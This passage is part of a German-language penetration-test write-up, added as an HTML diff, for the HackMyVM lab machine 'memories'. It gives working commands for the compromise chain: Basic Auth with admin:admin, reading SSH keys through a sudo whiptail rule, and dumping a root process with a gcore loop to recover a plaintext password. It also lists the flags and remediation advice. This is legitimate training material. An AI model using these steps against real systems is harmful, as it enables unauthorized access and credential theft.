+            <p class="analysis"><strong>Schwachstellen:</strong> Schwache Basic Auth Credentials, Preisgabe eines privaten SSH-Keys.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Finde `/memories` (Status 401) mit `gobuster`.</li>
+                <li>Sende HTTP Request an `/memories` mit `Authorization: Basic YWRtaW46YWRtaW4=` (`admin:admin`).</li>
+                <li>Extrahiere Benutzernamen `laura` und SSH-Key aus der Antwort.</li>
+                <li>Speichere Key als `laurarsa`, `chmod 600 laurarsa`.</li>
+                <li>Login: `ssh -i laurarsa laura@memories.hmv`.</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Shell als Benutzer `laura`.</p>
+
+            <h3>POC Schritt 2: Privilege Escalation (laura zu lucy)</h3>
+            <p class="analysis"><strong>Schwachstelle:</strong> Unsichere `sudo`-Regel: `(lucy) NPASSWD: /usr/bin/whiptail`.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> Shell als `laura`.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Führe `sudo -l` aus, um die Regel zu finden.</li>
+                <li>Lese Lucys SSH-Key: `sudo -u lucy /usr/bin/whiptail --textbox /home/lucy/.ssh/id_rsa 40 80`.</li>
+                <li>Extrahiere Key, speichere als `lucyrsa`, `chmod 600 lucyrsa`.</li>
+                <li>Login: `ssh -i lucyrsa lucy@memories.hmv`.</li>
+            </ol>
+            <p class="analysis"><strong>Ergebnis:</strong> Shell als Benutzer `lucy`.</p>
+
+            <h3>POC Schritt 3: Privilege Escalation (lucy zu root)</h3>
+            <p class="analysis"><strong>Schwachstelle:</strong> Unsichere `sudo`-Regel: `(ALL : ALL) NPASSWD: /usr/bin/gcore`, Klartextpasswort im Speicher.</p>
+            <p class="analysis"><strong>Voraussetzungen:</strong> Shell als `lucy`.</p>
+            <p class="analysis"><strong>Schritte:</strong></p>
+            <ol>
+                <li>Führe `sudo -l` aus, um die Regel zu finden.</li>
+                <li>Starte Loop, um Core-Dump von `/root/memories` zu erstellen: `while true ; do ps -aux | grep memories | awk {'print $2'} | xargs sudo /usr/bin/gcore ; done`.</li>
+                <li>Analysiere erstellte Core-Datei(en) mit `strings`, suche nach Passwort (gefunden: `whataboutyourthinking`).</li>
+                <li>Wechsle zu Root: `su root` (Passwort eingeben).</li>
+            </ol>
+             <p class="analysis"><strong>Ergebnis:</strong> Root-Shell.</p>
+             <p class="analysis"><strong>Beweismittel:</strong> Erfolgreicher `su`-Befehl, Lesen von `/root/ro0t.txt` möglich.</p>
+
+             <p class="evaluation"><strong>Risikobewertung:</strong> Hoch. Eine Kette von Fehlkonfigurationen (schwache Basic Auth, exponierter Key, unsichere `sudo`-Regeln) und einer Schwachstelle (Klartextpasswort im Speicher) ermöglicht die vollständige Kompromittierung des Systems.</p>
+             <p class="recommendation"><strong>Empfehlungen:**
+*   **Admin:** Basic Auth härten/ersetzen. Secrets nicht im Webroot speichern. `sudo`-Regeln extrem restriktiv gestalten (kein `whiptail`, kein `gcore`, kein `ALL:ALL NOPASSWD`). Passwörter niemals im Klartext im Speicher halten.
+*   **Pentester:** Die einzelnen Eskalationsschritte und die zugrundeliegenden Fehlkonfigurationen klar dokumentieren.</p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /home/lucy/user.txt</div> <!-- Korrekter Pfad für diese Flag -->
+                     <div class="flag-value"><span class="password">imissingsomething</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /root/ro0t.txt</div> <!-- Dateiname leicht abweichend -->
+                     <div class="flag-value"><span class="password">HMVtakingthisgames</span></div>
+                 </div>
+             </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 12. November 2022</p> <!-- Datum angepasst -->
+    </footer>
+</body>
+</html>
